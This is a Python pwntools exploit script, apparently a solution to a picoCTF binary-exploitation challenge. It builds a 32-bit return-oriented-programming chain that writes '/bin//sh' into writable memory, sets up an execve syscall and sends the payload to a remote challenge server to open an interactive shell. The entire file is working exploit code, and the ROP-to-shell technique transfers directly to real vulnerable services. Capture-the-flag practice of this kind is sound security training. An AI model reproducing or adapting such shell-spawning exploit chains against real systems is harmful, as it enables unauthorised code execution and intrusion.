#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
context.terminal = ["tmux", "splitw", "-h", "-F", "#{paneid}", "-P"]

context.binary = exe

# ---GADGETS---
POP_EAX = 0x080b073a           # pop eax ; ret
POP_ECX = 0x08049e29           # pop ecx ; ret
POP_EDX_POP_EBX = 0x080583b9   # pop edx ; pop ebx ; ret
MOV_DWORD_EDX_EAX = 0x080590f2 # mov dword ptr [edx], eax ; ret
SYSCALL = 0x0806417d           # syscall
RET = 0x0804900e
#--------------

WRITEABLE_MEMORY = 0x080e5000
BINSH_1 = 0x68732f2f # hs//
BINSH_2 = 0x6e69622f # nib/

def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
    else:
        r = remote("saturn.picoctf.net", 63373)

    return r


def generate_offset():
    pattern = b""
    for c in range(ord("a"), ord("h")-1):
        # pattern += chr(c).encode()*4
        pattern += p32(0x0)
    pattern += p32(0x0)

    return pattern


def main():
    r = conn()

    # good luck pwning :)
    rop_chain  = [
        # WRITE /bin//sh
        POP_EDX_POP_EBX,
        WRITEABLE_MEMORY,# EDX <-- WRITEABLE_MEMORY
        0x0, # EBX <-- 0x0
        RET,

        POP_EAX,
        BINSH_2,

        MOV_DWORD_EDX_EAX,

        POP_EDX_POP_EBX,
        WRITEABLE_MEMORY + 4, # EDX <-- WRITEABLE_MEMORY + 4
        0x0, # EBX <-- 0x0
        RET,

        POP_EAX,
        BINSH_1,

        MOV_DWORD_EDX_EAX,

        POP_EDX_POP_EBX,
        WRITEABLE_MEMORY + 8,
        0x0,
        RET,

        POP_EAX,
        0x0,

        MOV_DWORD_EDX_EAX,

        # Set up registers
        POP_EAX,
        0xb,
        POP_EDX_POP_EBX,
        0x0,
        WRITEABLE_MEMORY,
        RET,
        POP_ECX,
        0x0,

        SYSCALL
    ]
    rop_chain = b"".join(p32(gadget) for gadget in rop_chain)

    payload = generate_offset() + rop_chain
    with open("shellcode", "wb") as f:
        f.write(payload)
    r.recvuntil("grasshopper!\n")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
